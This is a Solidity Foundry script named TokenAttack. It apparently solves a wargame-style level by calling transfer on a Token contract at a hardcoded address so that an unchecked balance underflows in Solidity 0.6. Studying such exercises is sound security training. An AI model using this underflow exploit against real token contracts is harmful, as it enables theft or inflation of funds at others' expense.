// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import {Script} from "forge-std/Script.sol";

contract TokenAttack is Script {
    Token public tokenInstance = Token(0xE9FB1f3429095DD6f067aAd62098E277b79689d4);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        tokenInstance.transfer(address(tokenInstance), 21);

        vm.stopBroadcast();
    }
}